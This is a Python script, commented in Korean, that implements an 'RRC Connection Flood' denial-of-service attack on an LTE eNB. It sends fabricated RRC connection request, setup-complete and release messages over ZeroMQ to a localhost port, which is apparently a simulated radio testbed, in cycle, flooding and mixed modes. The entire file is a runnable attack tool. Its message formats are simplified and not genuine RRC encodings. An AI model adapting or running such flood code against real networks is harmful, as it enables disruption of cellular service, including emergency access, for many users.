#!/usr/bin/env python3
"""
RRC Connection Flood Attack
RRC 연결 과정을 반복하여 eNB의 연결 관리 리소스를 고갈시키는 공격
"""

import zmq
import struct
import time
import threading
import random
from datetime import datetime

class RRCConnectionFlood:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        self.attack_threads = []
        
    def create_rrc_connection_request(self, ue_id):
        """RRC Connection Request 메시지 생성"""
        message = struct.pack('>H', 0x0001)  # Message Type: RRC Connection Request
        message += struct.pack('>I', ue_id)  # UE Identity
        message += struct.pack('>H', 0x0000)  # Establishment Cause: Emergency
        message += struct.pack('>H', 0x0000)  # Spare
        
        # 복잡한 UE 정보 추가 (처리 부담 증가)
        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
        message += struct.pack('>H', random.randint(1, 65535))  # LAI
        message += struct.pack('>B', random.randint(1, 255))  # RRC State
        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
        message += struct.pack('>H', random.randint(1, 65535))  # Tracking Area Code
        
        return message
    
    def create_rrc_connection_setup_complete(self, ue_id):
        """RRC Connection Setup Complete 메시지 생성"""
        message = struct.pack('>H', 0x0003)  # Message Type: RRC Connection Setup Complete
        message += struct.pack('>I', ue_id)  # UE Identity
        message += struct.pack('>H', 0x0000)  # Spare
        
        # NAS 메시지 포함 (추가 처리 부담)
        message += struct.pack('>B', 0x41)  # NAS Message Type: Attach Request
        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
        message += struct.pack('>H', random.randint(1, 65535))  # LAI
        
        return message
    
    def create_rrc_connection_release_request(self, ue_id):
        """RRC Connection Release Request 메시지 생성"""
        message = struct.pack('>H', 0x0004)  # Message Type: RRC Connection Release Request
        message += struct.pack('>I', ue_id)  # UE Identity
        message += struct.pack('>H', 0x0000)  # Spare
        
        # Release Cause (복잡한 원인)
        message += struct.pack('>B', random.randint(1, 10))  # Release Cause
        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
        
        return message
    
    def send_message(self, message, message_type):
        """메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f'tcp://localhost:{self.target_port}')
            
            socket.send(message, zmq.NOBLOCK)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type}: {len(message)} bytes")
            
            socket.close()
            return True
            
        except Exception as e:
            print(f"메시지 전송 오류: {e}")
            return False
    
    def rrc_connection_cycle(self, ue_id, duration=60):
        """RRC 연결 사이클 공격"""
        start_time = time.time()
        cycle_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 1단계: RRC Connection Request
                rrc_request = self.create_rrc_connection_request(ue_id)
                self.send_message(rrc_request, f"RRC Connection Request #{cycle_count}")
                time.sleep(0.1)
                
                # 2단계: RRC Connection Setup Complete
                rrc_complete = self.create_rrc_connection_setup_complete(ue_id)
                self.send_message(rrc_complete, f"RRC Connection Setup Complete #{cycle_count}")
                time.sleep(0.1)
                
                # 3단계: RRC Connection Release Request
                rrc_release = self.create_rrc_connection_release_request(ue_id)
                self.send_message(rrc_release, f"RRC Connection Release Request #{cycle_count}")
                
                cycle_count += 1
                time.sleep(0.2)  # 다음 사이클까지 대기
                
            except Exception as e:
                print(f"RRC 연결 사이클 오류: {e}")
                time.sleep(1)
    
    def flooding_attack(self, num_ues=100, duration=60):
        """플러딩 공격 (다수 UE 동시 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 RRC Connection Request 전송
                for ue_id in range(num_ues):
                    rrc_request = self.create_rrc_connection_request(1000 + ue_id)
                    self.send_message(rrc_request, f"Flooding UE {ue_id}")
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.1)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"플러딩 공격 오류: {e}")
                time.sleep(1)
    
    def start_attack(self, attack_type="cycle", num_ues=10, duration=60):
        """공격 시작"""
        print(f"=== RRC Connection Flood Attack 시작 ===")
        print(f"공격 유형: {attack_type}")
        print(f"UE 수: {num_ues}")
        print(f"지속 시간: {duration}초")
        print(f"대상 포트: {self.target_port}")
        print("=" * 50)
        
        self.running = True
        
        if attack_type == "cycle":
            # RRC 연결 사이클 공격
            thread = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "flooding":
            # 플러딩 공격
            thread = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "mixed":
            # 혼합 공격
            thread1 = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
            thread2 = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
            
            thread1.daemon = True
            thread2.daemon = True
            
            thread1.start()
            thread2.start()
            
            self.attack_threads.extend([thread1, thread2])
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("\n=== 공격 중지 ===")
        self.running = False
        
        # 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        # ZeroMQ 정리
        self.context.term()
        print("공격 완료")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='RRC Connection Flood Attack')
    parser.add_argument('--attack-type', choices=['cycle', 'flooding', 'mixed'], 
                       default='cycle', help='공격 유형')
    parser.add_argument('--num-ues', type=int, default=10, help='UE 수')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
    
    args = parser.parse_args()
    
    attack = RRCConnectionFlood(args.target_port)
    
    try:
        attack.start_attack(args.attack_type, args.num_ues, args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
